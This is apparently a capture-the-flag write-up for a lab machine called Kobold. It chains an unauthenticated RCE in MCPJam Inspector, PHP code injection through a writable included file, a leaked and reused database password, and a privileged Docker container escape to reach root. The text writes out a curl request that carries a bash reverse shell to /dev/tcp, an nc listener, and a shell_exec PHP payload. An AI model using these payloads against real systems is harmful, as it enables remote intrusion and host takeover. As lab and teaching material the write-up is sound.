Kobold

An Easy Linux box dressed as a container-operations suite, where root is not one bug but a chain of small, reasonable reaches. Foothold is an unauthenticated RCE in MCPJam Inspector (CVE-2026-23744). Then an operator-writable PrivateBin file gives code execution inside its container, the container's config leaks a database password, that password is reused as the Arcane admin credential, and Arcane, running as root over the docker daemon, launches a privileged container that owns the host.

Orientation

MCPJam Inspector is a developer tool for poking at MCP servers, the "USB-C for AI tools" plumbing. PrivateBin is a zero-knowledge pastebin. Arcane is a docker-management dashboard. The theme is coherent, and so is the chain, since each app hands you the key to the next.

02

Foothold as benMCPJam Inspector · CVE-2026-23744 · unauthenticated RCE

MCPJam Inspector connects to MCP servers so a developer can inspect them. An MCP server, in the stdio transport, is just a local process the inspector launches and talks to over stdin and stdout. The connect endpoint therefore takes a command and its arguments and runs them. That is fine on 127.0.0.1, which is where a debug tool belongs. Version 1.4.2 binds to 0.0.0.0 instead and requires no authentication, so the "launch this MCP server" feature becomes "run this command" for anyone who can reach the port.

CVE-2026-23744 — MCPJam Inspector ≤ 1.4.2

Unauthenticated POST /api/mcp/connect accepts a serverConfig with command and args and executes it as the service owner, no credentials required. Fixed in 1.4.3 by binding to loopback and adding auth. The endpoint tells you exactly what it wants when you knock on it empty.

the endpoint names its own parameter
db-d2@kali:~$ curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect -H 'Content-Type: application/json' -d '{}'
{"success":false,"error":"serverConfig is required"}

Give it a serverConfig whose command is a reverse shell. setsid detaches the shell from the connection so it survives when the inspector tears the MCP session down.

fire it
db-d2@kali:~$ nc -lvnp 4444 &
db-d2@kali:~$ curl -sk https://mcp.kobold.htb/api/mcp/connect -H 'Content-Type: application/json' \
  -d '{"serverConfig":{"command":"setsid","args":["bash","-c",
       "bash -i >& /dev/tcp/10.10.16.212/4444 0>&1"],"env":{}},"serverId":"x"}'
connect to [10.10.16.212] from (UNKNOWN) [10.129.39.254]

03

ben → the PrivateBin containeran operator-writable file that PrivateBin runs

So enumerate from where ben actually stands, starting with that operator group. What does it grant? It owns PrivateBin's data directory, and PrivateBin keeps a few small PHP state files there. Most are read-only, but not all.

a world-writable file PrivateBin loads
ben@kobold:~$ ls -la /privatebin-data/data/*.php
-rwxrwxrwx 1 root operator  47 /privatebin-data/data/purge_limiter.php
-rw-r----- 1 root operator 132 /privatebin-data/data/traffic_limiter.php
-rwxrwxrwx 1 root operator 522 /privatebin-data/data/salt.php
ben@kobold:~$ cat /privatebin-data/data/purge_limiter.php
<?php
$GLOBALS['purge_limiter'] = '1772628585';

PrivateBin does not read purge_limiter.php as text, it include()s it to pick up that global, and it does so during a paste creation to decide whether to purge expired pastes. Anything you put in that file is therefore executed as PHP the next time someone stores a paste. This is a code-execution primitive, and the interesting part is whose code it becomes.

Replace the file with a small probe, then create a paste to trigger the include.

overwrite, then trigger
ben@kobold:/privatebin-data/data$ cat > purge_limiter.php <<'PHP'
<?php @file_put_contents(__DIR__."/o.txt", shell_exec("id; hostname; ls /var/run/docker.sock 2>&1"));
$GLOBALS["purge_limiter"]="1772628585";
PHP

Why this crosses a boundary

The code did not run as ben. It ran as nobody on host 4c49dd7bb727, which is the PrivateBin container. The data directory is bind-mounted into that container, so a file ben can write becomes a file the container executes. There is no docker socket inside the container, so this is not a direct escape. What it does give is the container's own view of the filesystem, and one file there matters.

PrivateBin's conf.php lives at /srv/cfg/conf.php inside the container. On the host that directory is 750 root:82, so ben cannot read it, but the container's www-data is group 82, so from inside it is readable. Point the same primitive at it.

read the config the container can see
ben@kobold:/privatebin-data/data$ cat o.txt   # after re-pointing the probe at /srv/cfg/conf.php
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"

A database password, the only credential the whole container holds. The MySQL model is not even the active storage backend here, which makes the value feel like a leftover. It is not a leftover. It is the pivot.

Why Arcane is root, and why the CVEs were a distraction

Arcane 1.13.0 does have known issues, and it is tempting to reach for them. The updater command-injection is already patched in this build, and forging an admin token fails because the server re-validates the user against a database you cannot read. None of that is needed. The service authenticates you as a real admin with a real password, and an Arcane admin can create containers on a root-owned daemon. A container that bind-mounts the host root filesystem and runs privileged is root on the host. This is the docker-socket-equals-root principle, reached through a REST API instead of the socket.

Drive the API. List the environment, then create a privileged container from a locally present image that bind-mounts the host, and have it drop a SUID bash and copy out the flag.

The chain, plainly

Root here is four reuses of trust, each defensible on its own. A debug tool trusted its own network position and ran a command. A container trusted a bind-mounted file and executed it. A config file kept a password that a second service reused. And a dashboard trusted an admin password with the one thing that is always root, the docker daemon. No single step is exotic, and that is the point. Root is what you get when four ordinary conveniences line up behind one another.
